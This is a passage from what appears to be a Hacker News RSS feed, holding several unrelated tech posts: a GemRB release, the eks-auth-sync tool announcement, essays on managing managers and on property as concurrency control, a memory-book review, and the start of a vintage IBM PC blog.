<p>As GemRB marks its 20th anniversary, Jaka Kranjc, the current maintainer, is optimistic about
the project’s future. <em>“Our work is not finished, but this sort of thing is like an
ultramarathon — for most of the run the goal is not within reach. Companies come and go, but
FLOSS persists!”</em></p>

<p>The <a href="https://gemrb.org/2020/08/24/gemrb-0-8-7-released.html">new release</a>
brings over 500 changes manifested as bugfixes, smaller features, cleanups
and an improved setup experience. More than that, it introduces a new <a href="https://gemrb.org/2020/07/16/new-pathfinder-smarter-movement.html">smarter
pathfinder</a> with
bumping support and other movement related improvements. At the same time work continued
on the drawing and GUI handling rewrite — stay tuned for a deeper dive later this week.
With this anniversary release out of the way, finishing that rewrite is again the team’s
main priority.</p>

<p>Overall it’s clear that after all this time the GemRB effort is still active, slowly building
missing pieces of the Infinity Engine mosaic, revitalising older code, extending features and
working throughout the project to keep the effort vibrant for years to come. The team is
looking for <a href="https://github.com/gemrb/gemrb/blob/master/CONTRIBUTING.md">new contributors</a>,
especially programmers with OpenGL experience, who could help them finish a drawing backend
refactoring — for better performance and to remain available on a wide berth of platforms.</p>

<p>A pearl to you!</p>

<p><em>PS: check our news section in the following days for a daily retrospective with past maintainers and a look into the project’s future.</em></p>

<hr>
<p>Project links:</p>
<ul>
  <li>Web site: <a href="https://gemrb.org/">https://gemrb.org</a></li>
  <li>Downloads: <a href="https://gemrb.org/Install">https://gemrb.org/Install</a></li>
  <li>News: <a href="https://gemrb.org/News">https://gemrb.org/News</a> (RSS available)</li>
  <li>Screenshots: <a href="https://gemrb.org/Media">https://gemrb.org/Media</a></li>
</ul>

<p>If you want to be notified of further releases, subscribe to
<a href="https://sourceforge.net/projects/gemrb/lists/gemrb-release">gemrb-release</a> (low volume).</p>

<p>If you <em>need</em> to get in touch via email, write to &lt;registracije+gemrb20@lynxlynx.info&gt;.</p>

        
      </section>

      

      

      
  

    </div></div>]]>
            </description>
            <link>https://gemrb.org/2020/08/24/the-gemrb-project-celebrates-20-year-anniversary-with-a-new-release.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24258780</guid>
            <pubDate>Mon, 24 Aug 2020 09:11:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A new open-source tool: eks-auth-sync]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24258546">thread link</a>) | @mikkom
<br/>
August 24, 2020 | https://polarsquad.com/blog/announcing-a-new-open-source-tool-eks-auth-sync | <a href="https://web.archive.org/web/*/https://polarsquad.com/blog/announcing-a-new-open-source-tool-eks-auth-sync">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-2ff7ff97d879cc8a66ee"><div><p>At Polar Squad, we’ve been using <a href="https://aws.amazon.com/eks/" target="_blank">Amazon EKS</a> in our client projects since early 2019. We’ve found it to provide a great way to jump into Kubernetes on AWS while being able to offload a lot of the maintenance tasks to AWS. While we’ve seen the platform grow a lot, there’s still plenty of things that could be made easier to manage.</p><p>One of the tricky aspects of EKS is cluster authentication management. Authentication in EKS is configured using <a href="https://docs.aws.amazon.com/eks/latest/userguide/add-user-role.html" target="_blank">a single ConfigMap in the Kubernetes cluster</a> (<code>aws-auth</code>) that maps AWS IAM users and roles to users in Kubernetes. If you only have a fixed number of users and roles assigned to a cluster, it's easy enough to just create the ConfigMap once and forget about it. However, if the number of users and roles varies frequently (i.e. people join and leave the cluster), managing the ConfigMap can become a chore.</p><p>To assist with managing the EKS cluster authentication, we’ve created a new open source tool: <a href="https://gitlab.com/polarsquad/eks-auth-sync" target="_blank">eks-auth-sync</a>. You can use it to automate the synchronization of authentication configuration from various sources to EKS.</p><h2>How does it&nbsp;work?</h2><p>Here’s roughly what the eks-auth-sync tool does when you run it:</p><ol data-rte-list="default"><li><p>Read a given configuration file for a list of data sources (called “scanners”).</p></li><li><p>Read the data sources for all the available auth mappings, and join the results.</p></li><li><p>Update the auth mappings in your EKS cluster.</p></li></ol><p>We’ve intentionally kept the scope of the tool small and the design simple so that anyone with a bit of knowledge in Go, AWS, and Kubernetes can pick up and maintain it if they wish to.</p><h2>Where can I get&nbsp;it?</h2><p>You can download the release binaries and Docker images from Gitlab <a href="https://gitlab.com/polarsquad/eks-auth-sync/-/releases" target="_blank">releases page</a> and <a href="https://gitlab.com/polarsquad/eks-auth-sync/container_registry" target="_blank">container registry</a>. The source code is also hosted in <a href="https://gitlab.com/polarsquad/eks-auth-sync" target="_blank">Gitlab</a>.</p><h2>How do I use&nbsp;it?</h2><p>Check out the <a href="https://gitlab.com/polarsquad/eks-auth-sync#documentation" target="_blank">documentation section in the project README</a> to learn how to configure eks-auth-sync to scan configurations from various sources such as IAM and SSM parameters as well as how to deploy it as a Kubernetes CronJob.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597993296731_25248"><p>Made with ❤️ by Polar Squad</p></div></div>]]>
            </description>
            <link>https://polarsquad.com/blog/announcing-a-new-open-source-tool-eks-auth-sync</link>
            <guid isPermaLink="false">hacker-news-small-sites-24258546</guid>
            <pubDate>Mon, 24 Aug 2020 08:31:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Managing Teams Through Interfaces]]>
            </title>
            <description>
<![CDATA[
Score 52 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24258519">thread link</a>) | @jstanier
<br/>
August 24, 2020 | https://www.theengineeringmanager.com/managing-managers/managing-through-interfaces/ | <a href="https://web.archive.org/web/*/https://www.theengineeringmanager.com/managing-managers/managing-through-interfaces/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="primary" role="main">
		
<article id="post-1410">

			<!-- end .entry-header -->

		<div>
		
		<div>
			
<p><em>This article is part of a </em><a href="https://www.theengineeringmanager.com/managing-managers/"><em>series on managing managers</em></a><em>.</em></p>



<p>Making the switch to managing managers, and hence managing many teams, can be taxing on the brain. If you’ve not done it before, then you may look at others in more senior roles, potentially running organizations of hundreds of people, and wonder to yourself how they ever find any clock time or mental time for getting anything done.</p>



<p>If you’re used to running one team, that’s a reasonable thought to have. After all, running a team is a tough job. It involves balancing your time between managing others and making your own contributions, working with people outside of your team, deeply understanding the personalities and desires of your staff, and, of course, let’s not forget the most important thing: shipping software.</p>



<p>When viewed through this lens, the thought of having multiple teams may seem quite overwhelming. How are you meant to carry everything in your head that you did before, but at many times the scale? Well, the answer is that you <em>shouldn’t have to</em>. That’s exactly why you have managers reporting to you, which allows you to work at a higher level of abstraction.</p>



<p>Working at this higher level of abstraction allows you to focus your efforts on what’s important; whether that importance manifests in the <a href="https://www.theengineeringmanager.com/managing-managers/vp-director-what/">operational running of work streams or strategic planning for the future</a>. It allows you to step back and to focus your energy where it pays the greatest dividends: the outputs of tens, if not hundreds, of people.</p>



<p>Since those that read this website typically have a background in writing software, I’ll lean on a software engineering analogy in order to explain how you use your managers to work at this higher level of abstraction. We’re going to be looking at the interface between yourself and your managers by looking at, erm, <strong>interfaces</strong>. How handy.</p>



<h2>Interfaces</h2>



<p>The programming language that I have the most experience in is Java, so I’m going to lean on it for this particular analogy. An interface in Java, like in other languages, is a type that allows you to define abstract methods that other classes must have if they implement that interface.&nbsp;</p>



<p>So, for example, you may define an interface for a CurseGenerator:</p>



<pre><code>interface CurseGenerator {
  public String curse();
}</code></pre>



<p>Of which we could then implement a British version:</p>



<pre><code>public class BritishCurseGenerator implements CurseGenerator {
  public String curse() {
    return “Oh, bloody hell!”;
  }
}</code></pre>



<p>An interface allows extensibility in software systems because a particular piece of code can work with any class that implements a given interface, since the interface’s methods are checked to be present in the implementing class at compilation time.&nbsp;</p>



<p>Most importantly,&nbsp;the code that works with an interface <em>does not need to know the details of the implementation</em>.<em> </em>The implementing class can do whatever it wants as long as it abides by the contract of the method signatures. The interface <em>delegates </em>the implementation to the implementing class. </p>



<p>Do you see where this is going? I’m sure you do. Back to the management analogy:</p>



<ul><li><strong>As a manager of managers, you define what the interface that represents each of your teams looks like.</strong> For example, you may define particular measurements that are important, such as KPIs like application uptime, daily active users, and so on. You may also require that your managers hold weekly one to ones with each of their staff, write a report on progress to the rest of the company every two weeks, or to fix critical priority bugs in one business day.</li><li><strong>Each of your managers has the flexibility of deciding exactly how those teams are run, as long as they follow the interface contract.</strong> So the way in which they decide to tackle improving the uptime percentage or the number of daily active users is entirely up to them. Which member staff works on which part of the codebase is down to them and the team. How and when they schedule their one-to-ones and the content that they discuss is for them to decide. But fundamentally, they should be done to abide by the contract of the interface.</li></ul>



<p>Clear interfaces allow you to not have to worry about the exact implementation details of how each of your managers run their teams, but they allow you to make it clear <em>exactly what you expect of each of them in doing so, and therefore how you define success</em>. OK, I’ll stop the programming analogy now.</p>



<h2>Defining the interface</h2>



<p>So you start by defining that interface with each of your managers. There’s a neat exercise for your first one-to-one meetings (although you can do it at any time) called <a href="https://www.theengineeringmanager.com/management-101/contracting/">Contracting, that I’ve written about before</a>. You can expand on that Contracting exercise by having you both think about the answers to the following questions, which make up the interface:</p>



<ul><li><strong>What success looks like for the team.</strong> What measurements are being used to prove that the team is being successful? Is it working towards an outcome, or some KPI, or shipping particular projects on time? Does it also take into account the happiness, productiveness and psychological security of their staff? How will this information be gathered and made accessible to you?</li><li><strong>Which processes will be used to run the team.</strong> In order to be successful, how are they going to compose themselves? Will they use scrum, kanban, just get on with it, or something else? How do they intend to ship to production regularly? How will they prioritize and execute on their work? Each team of yours may operate differently depending on the skills and seniority of the people on each.</li><li><strong>How the manager interfaces with each of their own staff.</strong> They’ll need to think about the different personalities, skills and career development trajectories for each of their staff and consider what that means for how each of them can operate with autonomy, mastery and purpose. What is an acceptable cadence for one-to-ones? Do they prefer synchronous or asynchronous communication?&nbsp;</li><li><strong>How will you know if something is going wrong? </strong>Code throws errors or performs slowly, bringing problems to your attention. How will issues with the team be made visible so you can work on them together?</li><li><strong>Whether you’d occasionally like to inspect the implementation yourself.</strong> Although defining an interface is meant to hide the complexity from you, occasionally it’s interesting to look under the hood and see what’s going on there. You might have some suggestions to make it better, or you may even learn something new. You can arrange a cadence for skip-level meetings, occasionally pop-up in their group meetings to listen, and get feedback from the individuals and the team as a whole.</li></ul>



<p>With a little work up front on the interface, you can make it absolutely clear at what level of involvement you both feel comfortable with having in your relationship. This allows you to abstract away from issues you don’t need to know about as a manager of managers, and gives your direct report the freedom to run the team how they want, as long as the fundamentals that you expect are being implemented. And that’s great, because you can build a great coaching relationship from that foundation, rather than being at risk of micromanaging or firing and forgetting.</p>



<h2>Debugging problems</h2>



<p>Occasionally things will go wrong, as they do in code. You may need to get the debugger out to see what’s going on. But that’s OK, since you’ve already discussed the interface between you, your direct report, and their team. That interface gives you a number of methods to attach your debugger to.</p>



<p>Perhaps if the team’s cadence is slowing down, you can dig deeper into the processes that are being used to run the team. How often are they shipping? If that’s not very often, why is that? How does code get written, reviewed and deployed? You can keep <a href="https://www.theengineeringmanager.com/growth/first-principles-and-asking-why/">asking why</a> in order to get to the bottom of quirks that might be bugs. And then you can fix them together.</p>



<p>Sometimes it’s interesting to attach the debugger out of pure curiosity. You can do this in your one-to-ones with your direct report. Focus on one area of your interface and go deep into the implementation by asking questions. You’ll always find something worth discussing, and often there’s some neat performance optimizations to try out.</p>



<h2>Beginning with the end in mind</h2>



<p>So why have interfaces?&nbsp;</p>



<p>The ideal end state is that you have clear expectations and boundaries between yourself and the managers that are reporting into you. When you’ve made it clear which high-level functions that each of your managers should be performing, you can delegate the implementation to them so they can do so in whichever way they feel is best for them and their team.</p>



<p>This allows you to move away from details that you don’t need to spend your time focussing on, enabling you to work at a higher level of abstraction. If you were programming, this abstraction would allow you to concentrate on making the system surrounding the interface more efficient, extensible, performant and elegant. That’s exactly what you’ll be wanting to do with the organization, structure and strategic direction of teams as well.</p>



<p><a href="http://eepurl.com/cSMExr">You can sign up to my mailing list to hear when new posts are published.</a></p>
					</div><!-- end .entry-content -->

			</div><!-- end .entry-wrap -->

</article><!-- end .post-1410 -->
	<!-- #comments .comments-area -->
	</div></div>]]>
            </description>
            <link>https://www.theengineeringmanager.com/managing-managers/managing-through-interfaces/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24258519</guid>
            <pubDate>Mon, 24 Aug 2020 08:25:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apparatus with Magnets]]>
            </title>
            <description>
<![CDATA[
Score 45 | Comments 7 (<a href="https://news.ycombinator.com/item?id=24258396">thread link</a>) | @jiriro
<br/>
August 24, 2020 | https://www.notion.so/Apparatus-with-Magnets-Intro-2e32af5b59b64a45b3b203408374a56e | <a href="https://web.archive.org/web/*/https://www.notion.so/Apparatus-with-Magnets-Intro-2e32af5b59b64a45b3b203408374a56e">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/Apparatus-with-Magnets-Intro-2e32af5b59b64a45b3b203408374a56e</link>
            <guid isPermaLink="false">hacker-news-small-sites-24258396</guid>
            <pubDate>Mon, 24 Aug 2020 07:59:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Moonwalking with Einstein – Short Thoughts]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24258376">thread link</a>) | @HermanMartinus
<br/>
August 24, 2020 | https://herman.bearblog.dev/moonwalking-with-einstein/ | <a href="https://web.archive.org/web/*/https://herman.bearblog.dev/moonwalking-with-einstein/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div><p>It's been a while since I've read a book that covers something as novel as the art and science of being able to remember everything. Moonwalking with Einstein was certainly interesting. It follows the author, Josh Foer, on his journey to becoming the top mental athlete in the USA.</p>
<p>For those who don't know, memory championships are fairly obscure events where participants perform seemingly impossible feats of memory like memorizing multiple decks of cards and recalling them perfectly or recalling a page full of binary digits in perfect order.</p>
<p>The feats, while extraordinary, are accomplished using the ancient art of mnemonics; a series of memory techniques that use our innate ability to clearly remember images and places (especially if they are lewd or novel). The data the mnemonist is trying to remember are chunked (broken into smaller pieces) and associated with images and places.</p>
<p>The book runs readers through a few of these techniques (the <a href="https://artofmemory.com/wiki/Major_System">Major System</a>, <a href="https://artofmemory.com/wiki/Person-Action-Object_(PAO)_System">Person-Action-Object</a>, and the <a href="https://artofmemory.com/wiki/How_to_Build_a_Memory_Palace">Memory Palace</a>), which had me memorizing my shopping list and a bunch of books on the nearby shelf. It worked perfectly.</p>
<p>The usefulness of a good memory is discussed at length, and the book points out that modern humans rarely use their memory, rather looking up information than retaining it. Historically the ability to externalize information was a luxury (due to the availability and expense of books and writing material) and most people had to find a way to retain all information in their memory. A few religious groups today still practise the art of memorising their sacred texts.</p>
<p>It also argues that for contextual learning and novel ideation to take place, the person needs to have memorized the knowledge necessary to form those connections. It follows that if, as a species, we abandon memorization, we will have fewer novel ideas.</p>
<blockquote>
<p>“Memory is like a spiderweb that catches new information. The more it catches, the bigger it grows. And the bigger it grows, the more it catches.”</p>
</blockquote>
<p>The book concludes, however, that while it is useful to have a great memory, what mental athletes do is more akin to a parlour trick and that real-world applications for that level of memorization, bar studying for an exam, are few and far between.</p>
<p>As for how this book impacted me; I have a newfound respect for memory as a whole, and will be practicing keeping information (generally my reading list, which grows daily) in my memory palace. I'm also becomming adept at remembering phone numbers, mostly cause I think it's neat.</p>
<blockquote>
<p>“I’m convinced that remembering more is only the most obvious benefit of the many months I spent training my memory. What I had really trained my brain to do, as much as to memorize, was to be more mindful, and to pay attention to the world around me. Remembering can only happen if you decide to take notice.”</p>
</blockquote>
</div>
</div></div>]]>
            </description>
            <link>https://herman.bearblog.dev/moonwalking-with-einstein/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24258376</guid>
            <pubDate>Mon, 24 Aug 2020 07:56:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Private Property and Social Hierarchies as Concurrency Control Mechanisms]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24258069">thread link</a>) | @monort
<br/>
August 23, 2020 | https://apxhard.com/2020/08/20/private-property-and-social-hierarchies-as-concurrency-control-mechanisms/ | <a href="https://web.archive.org/web/*/https://apxhard.com/2020/08/20/private-property-and-social-hierarchies-as-concurrency-control-mechanisms/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-423">

		<!-- .entry-header -->

		
		<div>

			<div>
				
<h3>Or: Why Javascript Developers are Often Marxists</h3>



<p>We’ve all heard the idea of the tragedy of the commons: the idea that when nobody has an incentive to maintain a shared resource, everyone following their own incentives causes the demise of the shared resource. A typical example given here is a pasture in which sheep graze. If everyone limits the amount their sheep consume, then the pasture has enough for everyone. Since feeding your own sheep more than everyone else allows your sheep to produce more wool and baby sheep, there is an incentive for people to overgraze their own sheep, leading to the destruction of the pasture.</p>



<div><p>Ostensibly, private property solves this problem by giving someone both an incentive, and ability, to maintain the pasture.  Inherent here is the idea of scarcity and maintenance.  How important are they? If we imagined a pasture that didn’t need to be maintained, and couldn’t be overgrazed, would the tragedy of the commons still apply?</p><p> Perhaps counter-intuitively, I think the answer is “yes”.&nbsp; I believe public (i.e. unowned) resources end up having the same problems as shared, mutable, global state: maintaining invariants becomes impossible.&nbsp; Thus, in addition to creating incentives, private property acts as something like a form of concurrency control. Legal ownership fulfills a similar function as a <a href="https://en.wikipedia.org/wiki/Lock_(computer_science)">mutex</a>: it allows for a single intended use to play out entirely, rather than having some resource continually thrashing between various use cases, and ultimately producing nothing.</p></div>



<p>When people ask me to imagine a world without private ownership, I immediately start running into practical problems. Let’s say I want to use a giant warehouse for an indoor waterpark, and someone else wants to use the same giant warehouse for a paintball obstacle course.&nbsp; How do we resolve the conflict between the two of us?&nbsp; In a world with private ownership, the conflict is resolved by whoever owns the property making the decision, and a system of courts and law enforcement creating incentives for people to respect that decision.</p>



<div><p>Producing anything of long term value usually requires some form of investment; a period of time in which state is being manipulated just so, and yet no value has been created. Only after state has been arranged just right, is the value created.  While people build a house, it’s completely unusable.  The work that is done is only valuable if the house can be completed. </p><p>If a house is mostly built, and a hurricane blows it away before anyone can live inside, was any value really created?</p></div>



<div><p>Private property as an institution allows one algorithm to take as long as it wants to manipulate state in order to produce some value. Absent this mechanism, I don’t know how any long term value could be created.&nbsp; If someone else can take the crops after I’ve planted them, watered them, and tended them, whatever purpose they have might be supplanted by <em>another </em>party coming to take the item from them. </p><p>Even if you get rid of incentives and imagine we are all driven fully by the public good, we all have different notions of what that means. Multiple threads in the same processor aren’t tripping each other up due to incentives; it isn’t that one thread says “you know I’d like to write a value to this hash table, but I’m concerned that other thread will replace one of the pointers in the bucket, so instead I just won’t bother.”  The two threads just go about their work, and the result is that the program crashes or produces incorrect results.</p></div>



<p>In a world without private ownership, I don’t know what prevents that same kind of thrashing.&nbsp; Making a functioning world economy without private ownership sounds like trying to manage a giant multithreaded computer system without any concurrency or synchronization primitives: a recipe for wasted effort.</p>



<p>Maybe the problem with having a public pasture isn’t<em> just </em>that one shepherd might have their sheep eat so much grass that the roots are gone and nothing can grow back. Maybe there’s <em>also </em>category of problems where one shepherd might be attempting to have their sheep arranged in a red-black tree, and some other shepherd wanted to use the space to encode lookup tables for a compression algorithm, and as a result, nobody managed to get their computing done and all of those cycles were wasted.</p>



<h3>Conflicts Lead to Massive Waste</h3>



<p>Speaking of waste, everyone on the internet agrees that arguing on the internet is a huge waste of time. You know what else is an even <em>bigger </em>waste of time? How about <a href="https://en.wikipedia.org/wiki/Warring_States_period">centuries of chaotic warfare</a> that make any form of long term investment impossible?&nbsp; Or, perhaps, how about getting <a href="https://apxhard.com/2020/07/27/ethical-systems-as-computational-optimizations/">angry and yelling at your spouse</a>? That’s a waste of time too.&nbsp;&nbsp;</p>



<p>All of these problems are fixed by strictly adhering to explicit social hierarchies.&nbsp; Of course, there are <em>other </em>problems with those, but I think few people alive today realize the benefits that explicit hierarchies have in terms of mitigating conflict.&nbsp;</p>



<p>I think if we want a society free of hierarchies, we need to understand the problems these hierarchies are solving. Otherwise, we’ll probably just create a new set of hierarchies while claiming we are doing something fundamentally different. Hierarchies are one extremely simple way of solving concurrency problems. If those problems continue to exist, it’s likely we’ll stumble into ‘new’ solutions that are identical to the old ones.</p>



<p>Any human relationship presents an ongoing stream of concurrency problems. People often have conflicting wants and needs.&nbsp; The work of maintaining a relationship includes identifying these conflicts and rectifying them.</p>



<p>I can reduce the likelihood of fighting with my wife by adopting the simple, explicitly hierarchical maximum that if we ever argue, she is always right and I am always wrong. Thinking this way made my ego squirm a little bit, but once I let go of that and just accepted that it never helps us to fight,&nbsp; I found that there is actually a kind of peace that comes from submitting completely to a source that you love and trust and know has your best interest at heart. When I think of friends whose judgement I trust, and who I know love me, there’s a kind of illicit thrill that comes with the idea of completely and totally surrendering to something that dominates you as it protects you.</p>



<p>From a concurrency control mechanism, there isn’t really a difference between “the duke obeys the king, and the lord obeys the duke”, and a protocol which assigns numeric values to locks, and says you can only pick up new locks if you go <em>down </em>the hierarchy.</p>



<p>It’s not at all hard to imagine why people like the idea of ‘the good king.’ If you pin me down, really hold me tight, hug me and tell me you’ll keep me safe, and ask “would you rather have the ability to vote for one of two sociopaths who claims to represent you, or have me, your lawful king protect you,” I know which way <em>my </em>limbic system would vote. The rational mind says “give me agency and the ability to navigate this reality as i see fit”, but the pack animal longs for a strong, just alpha to be both a source of protection and a sink for admiration.</p>



<p>Thus, the King acts like a global mutex over all states. If you’re a meme such as the Helix Fossil, and you want to instantiate yourself all over the domain, you’ll need to grab control over the ‘King’ mutex first.&nbsp; Once you have this ‘King’ mutex locked up, you can grab control over the ‘Duke’ and ‘Baron’ mutexes as needed, to levy your taxes, raise your workforce, and ultimately construct glorious statues in your likelihood. All praise <a href="https://twitchplayswiki.fandom.com/wiki/Lord_Helix">Lord Helix</a>!</p>



<p>However, If you try to acquire these mutexes in the reverse order, Bad Things are likely to happen to you, and the computing domain’s anti-viral mechanism (aka local clergy) will deem you to be heretical and you’ll be relegated to executing as a background thread in the underground economy.</p>



<h4>War and Deadlock</h4>



<p>We might view periods of social unrest in strictly hierarchical societies as being something like periods of deadlock in a concurrency system.&nbsp; Instead of making forward progress on committing transactions (i.e. continuing the business of keeping the kingdom alive and healthy) conflicts between the nobility can consume massive amounts of resources, both raw material and human lives.&nbsp; In a similar fashion, a poorly managed concurrent system will grab lots of memory and CPU cycles, without producing any useful work.&nbsp;</p>



<div><p>Of course, in the total <em>absence </em>of any hierarchy in society, you might see the same kinds of conflicts playing out, just at a much smaller scale: if people can steal and loot with impunity, we wouldn’t they?&nbsp; </p><p>This interplay between conflict-resolution structures both alleviating and leading to conflict leads us to what look like different forces that reach different equilibria in different geopolitical phases.</p><p>Smaller scale concurrency problems between tribes lead to the creation of states and governments; large scale concurrency problems between states and governments lead to the breakdown of those states and governments, and a resurgence of tribal power. We might see the <a href="https://en.wikipedia.org/wiki/Peace_of_Westphalia">Peace of Westphalia</a> as being something like a temporary patch over the distributed human operating system; the idea of nation states took a while for people to figure out how to hack, but they got it eventually – and that’s what we’re watching now, from <a href="https://en.wikipedia.org/wiki/Brexit">Brexit</a> to <a href="https://medium.com/@MarkPXuNeyer/pocket-jacks-one-night-in-las-vegas-96a7ebc14936">Trump</a> to <a href="https://en.wikipedia.org/wiki/Jair_Bolsonaro">Bolsonaro</a> to <a href="https://en.wikipedia.org/wiki/Viktor_Orb%C3%A1n">Orbán</a>.&nbsp; The global operating system is involved in a massive case of deadlock, leading to starvation, a slowdown in global productivity growth and thus a resurgence in tribalism.</p></div>



<div><p>The tradeoffs between a globalized economy and a patchwork of nationalism look a lot like tradeoffs involved in designing dataflows on a massively multicore system.&nbsp;</p><p>When you have a small number of processors, and plenty of chip-memory bandwidth, nationalism is less effective than globalized trade. &nbsp; Having an operating system running on a single core, and delegating work to …</p></div></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://apxhard.com/2020/08/20/private-property-and-social-hierarchies-as-concurrency-control-mechanisms/">https://apxhard.com/2020/08/20/private-property-and-social-hierarchies-as-concurrency-control-mechanisms/</a></em></p>]]>
            </description>
            <link>https://apxhard.com/2020/08/20/private-property-and-social-hierarchies-as-concurrency-control-mechanisms/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24258069</guid>
            <pubDate>Mon, 24 Aug 2020 06:47:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[IBM 5160]]>
            </title>
            <description>
<![CDATA[
Score 26 | Comments 23 (<a href="https://news.ycombinator.com/item?id=24258010">thread link</a>) | @hwdegroot
<br/>
August 23, 2020 | https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/ | <a href="https://web.archive.org/web/*/https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
        <div>
            <blockquote>
<p>640 Kilobytes!!!!1!!1 I shit you not. That is like 10 times the size of Donald Trump’s brain.</p>
</blockquote>
<p>Recently I was trying to get my son enthousiastic for programming. He is currently 7 years old and getting interested in all kinds of electronics,
so I thought that getting acquainted with programming would not hurt him. And I like to think of myself as a parent that stimulates his kids, so I used that
as an excuse to look into older computers, because <em>nostalgics</em>.</p>
<p><a href="#show-me-the-pics">Show me them footage</a></p>
<p>My kids grew up with LED monitors and TV’s and never really saw a real cathode tube, except on the episodes of <a href="https://en.wikipedia.org/wiki/Pat_%26_Mat">Pat &amp; Mat</a>.
I still remember the soft fading sound of of the tv turning off and the graphics vanishing into this thin line.</p>



<figure id="6fe72747c83aa07dbdebd9927f00a3d7">
    <p>
        
        <video controls="">
            <source src="https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/videos/mesmerizing-shutdown.mp4" type="video/mp4">
            Your browser does not support the video tag.
        </video>

    
    
    <figcaption>
        <small>
            
Mesmerizing shutdown. The terminal vanishes into a line.

        </small>
    </figcaption>
    
    </p>
</figure>


<p>Besides that, I am a fan of clicky keyboards. I have a <a href="https://www.daskeyboard.com/daskeyboard-4C-ultimate/">DasKeyboard 4C ultimate</a> tenkeyless with Cherry Blue switches and a <a href="https://www.daskeyboard.com/daskeyboard-4C-tenkeyless-professional/">4C Profressional</a> with brown switches. Sitting at home during the
corona period, made me google old skool stuff a lot.</p>
<p>So first I laid my eyes on a <a href="https://clickykeyboards.com/product/ibm-model-m2-1395300-made-by-ibm-06-30-1993/">IBM Model M2</a> and got this pretty cheap on
the dutch eBay. Getting this to work on my modern laptop was not rocket science, but not straight forward either. I warned my collegues
that the quiet days at the office were over. But this also opened up a window into vintage computers and computing. What if I could get a vintage computer, I thought. How awesome would that be?</p>
<p>How cool would it be to program a vintage computer with my collegues, or my kids. With all the speed we get nowadays, who still thinks about the limits of computing power. This will be totally different if you have just a fraction of the memory and chip available.</p>
<h2 id="ibm-5160">IBM 5160</h2>
<p>I am from 1983. So I was looking for a computer from that year. IBM was <em>the company</em> in those days for personal computing and when it came to makeing PC’s (I am NOT an apple fan). So I found that IBM produced the <a href="https://en.wikipedia.org/wiki/IBM_Personal_Computer_XT"><strong>IBM PC XT</strong></a> in that year. I also found out that you could still get them online for a reasonable price.
Luckliy I was able to lay my hands on one, in a pretty good state. It came with an <a href="https://clickykeyboards.com/product-category/1986-1989-ibm-model-m-silver-label/">IBM Model M</a> keyboard with the silver label (the PC is from 1986). The sound of that is even better than than the <code>Model M2</code>.</p>


<figure id="c1eacc927bc26694d18237b77c9b6c5e">
    <p><audio controls="">
            <source src="https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/audio/IBM-model-m-oh-that-clicky-sound.mp3" type="audio/mpeg">
            Your browser does not support the audio tag.
        </audio>
    </p>
    
    <figcaption>
        <small>
            
Need I say more...

        </small>
    </figcaption>
    
</figure>


<p>After introducing my kids to th <code>DIR</code> command (it was the only one I was pretty sure about it would work), they wanted to type “words” on the old computer (first success).</p>
<h2 id="exiting-vim-is-hard">Exiting Vim is hard?</h2>
<p>So, I know the <code>DIR</code> command. But now what. Let’s see what commands are available.</p>
<ul>
<li>No tab completion. <code>TAB</code> just places the cursor somewhere down the line</li>
<li>No <code>HISTORY</code>. You can repeat the last command by pressing the right-arrow.</li>
</ul>
<p><strong>FEEDBACK</strong></p>
<blockquote>
<p>This is incorrect. You say that you have IBM PC DOS 5. If so, this includes the DOSKEY command. This will give you a command-line history with editing. Just type <code>dos\doskey</code> to load it.</p>
</blockquote>
<p>For a starters, on <code>IBM DOS</code> (version 5.0) there is no <code>$PATH</code>. The executables are located in <code>C:\DOS</code> (or <code>c:\dos</code>, because <code>DOS</code> don’t care about casing). the most executables are located. After a day or two I figured this out, so I finally managed to open my first <code>BASIC</code> program. All fine, until I wanted to quit the program. It’s not that easy as <a href="https://stackoverflow.com/questions/11828270/how-do-i-exit-the-vim-editor">exiting <code>Vim</code></a>. It took me quite some time googling, until I finally found this <a href="https://stackoverflow.com/questions/44253055/how-can-i-exit-microsoft-gw-basic-ibm-basica-or-other-similar-old-dialects-of">lifesaver</a>.</p>
<p><strong>FEEDBACK</strong></p>
<blockquote>
<p>There certainly should be! DOS has 2 configuration files, which live in the root directory of the boot drive (A: or C:). They are called [1] CONFIG.SYS and [2] AUTOEXEC.BAT. In the 2nd, there should be a line:
<code>PATH=C:\DOS; C:\</code></p>
</blockquote>








<figure id="1fadd62c83243e573af5941d4eb32c02">
    <div>
